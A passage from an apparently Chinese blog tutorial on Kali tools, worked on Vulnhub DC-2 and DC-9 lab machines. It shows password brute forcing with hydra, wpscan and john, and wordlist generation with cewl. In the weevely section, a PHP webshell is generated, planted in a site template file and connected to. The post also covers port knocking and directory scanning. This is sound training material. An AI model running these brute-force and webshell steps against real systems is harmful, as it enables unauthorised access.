class=\"hljs-selector-tag\">p</span>的文件是kali自带的密码包，当然也可以用其他的<br><br>-s 端口<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220830211739164.png\" alt=\"image-20220830211739164\"></p>\n<p>这里就看到<code>flag4</code>用户的密码被爆破出来，是<code>orange</code></p>\n<p>然后用<code>ssh</code>连接</p>\n<figure class=\"highlight angelscript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs angelscript\">输入ssh <span class=\"hljs-symbol\">flag4@</span><span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.133</span><span class=\"hljs-number\">.136</span><br>然后yes<br>然后输入密码：orange<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220830211817515.png\" alt=\"image-20220830211817515\"></p>\n<h2 id=\"3）cewl\"><a href=\"#3）cewl\" class=\"headerlink\" title=\"3）cewl\"></a>3）cewl</h2><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p> <code>Cewl是一个通过指定url及深度,使用爬虫技术,生成字典的一个工具。Cewl是通过ruby编写,通过爬取网站并提取独立的单词保存为字典,可以和John the Ripper等工具配合使用。</code></p>\n<p> <code>主要还是根据网站自身的关键词，然后生成的字典，比如cewl，flag等等</code></p></blockquote>\n<p><strong>这里以vulnhub dc2为例</strong></p>\n<figure class=\"highlight 1c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs 1c\">-w等同于&gt;   <span class=\"hljs-comment\">//写入</span><br>-m n       <span class=\"hljs-comment\">//至少生成的长度为n，默认是3</span><br>-d x       <span class=\"hljs-comment\">//生成更大的字典，默认x=2</span><br></code></pre></td></tr></table></figure>\n\n\n\n<p>我们用<code>cewl</code>试试生成字典</p>\n<figure class=\"highlight 1c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs 1c\">输入cewl http:<span class=\"hljs-comment\">//dc-2/ &gt;pass.txt</span><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220831221031390.png\" alt=\"image-20220831221031390\"></p>\n<p>目录下就会生成<code>pass.txt</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">输入<span class=\"hljs-built_in\">cat</span> pass.txt，查看内容<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220831221151099.png\" alt=\"image-20220831221151099\"></p>\n<p>发现是生成对应网站的密码字典</p>\n<h2 id=\"4）wpscan\"><a href=\"#4）wpscan\" class=\"headerlink\" title=\"4）wpscan\"></a>4）wpscan</h2><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><code>WPScan是Kali Linux默认自带的一款漏洞扫描工具,它采用Ruby编写 能够扫描WordPress网站中的多种安全漏洞,其中包括主题漏洞、插件漏洞和WordPress本身的漏洞</code></p></blockquote>\n<p><strong>这里以vulnhub dc2为例</strong></p>\n<figure class=\"highlight qml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs qml\">wpscan -<span class=\"hljs-built_in\">url</span> <span class=\"hljs-attribute\">http</span>:<span class=\"hljs-comment\">//dc-2 -e u</span><br><br>-e u    <span class=\"hljs-comment\">//枚举用户信息</span><br><br>wpscan -<span class=\"hljs-built_in\">url</span> xx -P xx -U xx<br>-P passwdspath  <span class=\"hljs-comment\">//密码字典路径，或者直接写</span><br>-U userspath    <span class=\"hljs-comment\">//用户名字典路径，或者直接写</span><br></code></pre></td></tr></table></figure>\n\n\n\n<p>于是我们就可以针对性对wordpress进行渗透看看，可不可以利用一下</p>\n<figure class=\"highlight jboss-cli\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs jboss-cli\">输入wpscan <span class=\"hljs-params\">--url</span> http:<span class=\"hljs-string\">//dc-2</span> -e u<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220831223359965.png\" alt=\"image-20220831223359965\"></p>\n<p>然后往下看用户名</p>\n<p><img src=\"/post/tooluse(Commontools)/image-20220831223432802.png\" alt=\"image-20220831223432802\"></p>\n<p>发现有三个，然后可以复制下来，弄一个用户名的文本，和之前的<code>pass.txt</code>这个密码本一样</p>\n<figure class=\"highlight mipsasm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs mipsasm\">输入vi un.txt,把admin <span class=\"hljs-keyword\">jerry </span>tom复制进去<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220831223714569.png\" alt=\"image-20220831223714569\"></p>\n<p>然后就可以结合我们的密码文本和用户名文本，利用wpscan这个工具，进行爆破操作了</p>\n<figure class=\"highlight jboss-cli\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs jboss-cli\">输入wpscan <span class=\"hljs-params\">--url</span> http:<span class=\"hljs-string\">//dc-2</span> -P pass.txt -U un.txt<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220831223950721.png\" alt=\"image-20220831223950721\"></p>\n<p>稍微等一会</p>\n<p><img src=\"/post/tooluse(Commontools)/image-20220831224205560.png\" alt=\"image-20220831224205560\"></p>\n<p>admin用户密码没有找到，应该是最高权限的账号</p>\n<p>但是jerry和tom用户的密码知道了</p>\n<h2 id=\"5）John\"><a href=\"#5）John\" class=\"headerlink\" title=\"5）John\"></a>5）John</h2><p>John是一个破解系统密码的工具</p>\n<p>使用很简单</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs stylus\">john passwd<span class=\"hljs-selector-class\">.txt</span> <span class=\"hljs-comment\">//这里是直接利用john自带的密码本，后面接的是需要爆破的密码文本文件</span><br><br>john <span class=\"hljs-attr\">--wordlist</span>=字典路径 passwd<span class=\"hljs-selector-class\">.txt</span> <span class=\"hljs-comment\">//这里是指定密码本，后面接的是需要爆破的密码文本文件</span><br></code></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs stylus\">john <span class=\"hljs-attr\">--show</span> passwd<span class=\"hljs-selector-class\">.txt</span> <span class=\"hljs-comment\">//这是查看该密码文本中已经被爆破成功过的密码</span><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220903140126704.png\" alt=\"image-20220903140126704\"></p>\n<p>就可以看到明文为<code>snoopy</code></p>\n<h2 id=\"6）weevely\"><a href=\"#6）weevely\" class=\"headerlink\" title=\"6）weevely\"></a>6）weevely</h2><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>Weevely是一款使用python编写的webshell工具,集webshell生成和连接于一身,采用c&#x2F;s模式 构建,可以算作是linux下的一款php菜刀替代工具</p></blockquote>\n<p>生成Shell</p>\n<figure class=\"highlight verilog\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs verilog\">weevely <span class=\"hljs-keyword\">generate</span>  &lt;文件名&gt;<br><br><br>weevely <span class=\"hljs-keyword\">generate</span> <span class=\"hljs-number\">123456</span> shell<span class=\"hljs-variable\">.php</span><br></code></pre></td></tr></table></figure>\n\n<p>把生成的内容，复制到我们创建的<code>789.php</code>文件里，和前面两个方法步骤一样</p>\n<p>利用触发shell</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">weevely</span> http://<span class=\"hljs-number\">192.168.133.139</span>/templates/protostar/<span class=\"hljs-number\">789</span>.php <span class=\"hljs-number\">123456</span><br><br><span class=\"hljs-attribute\">python</span> -m http.server <span class=\"hljs-number\">9999</span>   <br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220904133118746.png\" alt=\"image-20220904133118746\"></p>\n<p>成功进入shell</p>\n<h2 id=\"7）whatweb\"><a href=\"#7）whatweb\" class=\"headerlink\" title=\"7）whatweb\"></a>7）whatweb</h2><figure class=\"highlight 1c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs 1c\">whatweb http:<span class=\"hljs-comment\">//192.168.220.156/ &gt;&gt; whatweb.txt</span><br><span class=\"hljs-comment\">//把网站的框架信息导入到文本whatweb.txt中</span><br></code></pre></td></tr></table></figure>\n\n<p>这个工具主要是查看网站的框架，和<code>wapplzer</code>类似</p>\n<p><img src=\"/post/tooluse(Commontools)/image-20221103104233193.png\" alt=\"image-20221103104233193\"></p>\n<h2 id=\"8）knockd\"><a href=\"#8）knockd\" class=\"headerlink\" title=\"8）knockd\"></a>8）knockd</h2><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>在1920年代，当禁令如火如荼地进行时，如果您想进入说话状态，就必须知道秘密的敲门声，并正确地敲打它才能进入内部。</p>\n<p>端口敲门是现代的等同物。 如果您希望人们可以访问您计算机上的服务，但又不想将防火墙打开到Internet，则可以使用端口断开功能。<br>它允许您关闭防火墙上允许传入连接的端口，并在进行预先安排的连接尝试方式时自动打开它们。 连接尝试的顺序充当秘密敲门。 另一个秘密的敲门声关闭了港口。</p></blockquote>\n<p>什么意思呢，也就是说，我先关闭了一个端口</p>\n<p>但是呢，我为了我想要的人访问它，我写了一个<code>敲门的顺序（也就是访问端口的顺序）</code></p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\">顺序在<span class=\"hljs-regexp\">/etc/</span>knockd.conf<br></code></pre></td></tr></table></figure>\n\n<p>比如，</p>\n<p>我关闭了</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">22/ssh端口<br></code></pre></td></tr></table></figure>\n\n<p>我写了一个顺序</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">7893</span>,<span class=\"hljs-number\">6452</span>,<span class=\"hljs-number\">2412</span><br></code></pre></td></tr></table></figure>\n\n<p>这是三个端口</p>\n<p>我为什么为你<code>打开22端口</code>，原因是因为你<code>敲对了顺序</code></p>\n<p>这里就涉及<code>敲门的方法</code></p>\n<h3 id=\"1-knock命令\"><a href=\"#1-knock命令\" class=\"headerlink\" title=\"1&gt; knock命令\"></a>1&gt; knock命令</h3><figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">knock</span> <span class=\"hljs-number\">192.168.1.8</span> <span class=\"hljs-number\">7469</span> <span class=\"hljs-number\">8475</span> <span class=\"hljs-number\">9842</span> //<span class=\"hljs-number\">192.168.1.8</span>为目标ip<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-nc命令\"><a href=\"#2-nc命令\" class=\"headerlink\" title=\"2&gt;nc命令\"></a>2&gt;nc命令</h3><figure class=\"highlight accesslog\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs accesslog\">$ nc -v dc9 <span class=\"hljs-number\">7469</span><br><span class=\"hljs-number\">10.0.0.14</span>: inverse host lookup failed: Unknown host<br>(UNKNOWN) <span class=\"hljs-string\">[10.0.0.14]</span> <span class=\"hljs-number\">7469</span> (?) : Connection refused<br><br>$ nc -v dc9 <span class=\"hljs-number\">8475</span>                                                                                       <br><span class=\"hljs-number\">10.0.0.14</span>: inverse host lookup failed: Unknown host<br>(UNKNOWN) <span class=\"hljs-string\">[10.0.0.14]</span> <span class=\"hljs-number\">8475</span> (?) : Connection refused<br><br>$ nc -v dc9 <span class=\"hljs-number\">9842</span>                                                                                       <br><span class=\"hljs-number\">10.0.0.14</span>: inverse host lookup failed: Unknown host<br>(UNKNOWN) <span class=\"hljs-string\">[10.0.0.14]</span> <span class=\"hljs-number\">9842</span> (?) : Connection refused<br><br>也就是利用nc命令三次访问这<span class=\"hljs-number\">3</span>个端口<br></code></pre></td></tr></table></figure>\n\n<p>最后用<code>nmap</code>扫一下就看见<code>22</code>端口打开了</p>\n<h2 id=\"9-openssl\"><a href=\"#9-openssl\" class=\"headerlink\" title=\"9)openssl\"></a>9)openssl</h2><h3 id=\"SSL-简介\"><a href=\"#SSL-简介\" class=\"headerlink\" title=\"SSL 简介\"></a>SSL 简介</h3><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>按照我的理解来解释下，</p>\n<p>为了让网络通信更安全，需要认证和加密，认证是说明你是要找的人，加密是为了让截获中间报文第三者无法得到消息内容。</p>\n<p>为此有人设计了SSL，即套接字上的安全层，简单来说就是在TCP之上做一个安全通信层，HTTP on SSL 即是HTTPs，</p>\n<p>现在几乎所有的银行网站访问都是基于HTTPS协议的。<br>认证是通过证书+非对称加密算法来解决的</p></blockquote>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>openssl可以实现：秘钥证书管理、对称加密和非对称加密。</p></blockquote>\n<p>举一个例子</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\">openssl passwd -<span class=\"hljs-number\">1</span> -salt salt password<br>==&gt;<br><span class=\"hljs-variable\">$1</span><span class=\"hljs-variable\">$salt</span><span class=\"hljs-variable\">$qJH7</span>.N4xYta3aEG<span class=\"hljs-regexp\">/dfqo/</span><span class=\"hljs-number\">0</span><br><br>-<span class=\"hljs-number\">1</span>使用什么哈希算法。在我们的用例中，这无关紧要，因此我们使用 MD5，在现实世界的 PT 中应该避免使用 MD5，因为它不安全。<br><br>-salt salt用作盐的字符串。我选择字符串盐<br><br>password我们想使用的明文密码<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"10-gobuster\"><a href=\"#10-gobuster\" class=\"headerlink\" title=\"10)gobuster\"></a>10)gobuster</h2><h3 id=\"爆破目录\"><a href=\"#爆破目录\" class=\"headerlink\" title=\"爆破目录\"></a>爆破目录</h3><figure class=\"highlight armasm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs armasm\"><span class=\"hljs-symbol\">gobuster</span> dir -w <span class=\"hljs-meta\">common</span>.txt -u url<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"爆破子域名\"><a href=\"#爆破子域名\" class=\"headerlink\" title=\"爆破子域名\"></a>爆破子域名</h3><figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">gobuster</span> vhost -w subdomains-top1million-<span class=\"hljs-number\">5000</span>.txt -u 